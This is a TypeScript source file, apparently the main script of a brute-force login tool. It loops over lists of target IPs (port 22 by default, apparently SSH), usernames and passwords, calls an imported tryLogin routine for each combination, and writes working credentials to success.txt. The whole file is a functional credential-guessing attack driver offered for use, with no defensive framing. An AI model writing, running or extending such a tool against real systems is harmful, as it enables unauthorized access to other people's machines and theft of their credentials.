import fs from 'fs';
import readline from 'readline';
import { tryLogin } from './src/brute';

async function readLines(filePath: string): Promise<string[]> {
  const fileStream = fs.createReadStream(filePath);
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

  const lines: string[] = [];
  for await (const line of rl) {
    const trimmed = line.trim();
    if (trimmed.length > 0) lines.push(trimmed);
  }
  return lines;
}

// Append a line to successes.txt safely
function logSuccess(line: string) {
  fs.appendFileSync('success.txt', line + '\n');
}

async function index() {
  const [ipsFile, usersFile, passFile] = process.argv.slice(2);
  if (!ipsFile || !usersFile || !passFile) {
    console.log("Usage: bun index.ts data/ips.txt data/username.txt data/password.txt");
    process.exit(1);
  }

  const ips = await readLines(ipsFile);
  const users = await readLines(usersFile);
  const passwords = await readLines(passFile);

  for (const ipLine of ips) {
    const [host, portStr] = ipLine.split(':');
    const port = parseInt(portStr || '22');
    const key = `${host}:${port}`;

    let ipSuccess = false;

    for (const username of users) {
      if (ipSuccess) break;

      for (const password of passwords) {
        if (ipSuccess) break;

        const success = await tryLogin(host, port, username, password);

        if (success) {
          const successLine = `${key} => ${username}:${password}`;
          console.log(`[+] SUCCESS on ${successLine} — skipping remaining attempts on this IP.`);
          logSuccess(successLine);
          ipSuccess = true;
          break;
        }
      }
    }

    if (!ipSuccess) {
      console.log(`[-] No valid credentials found for ${key}`);
    }
  }
}

index();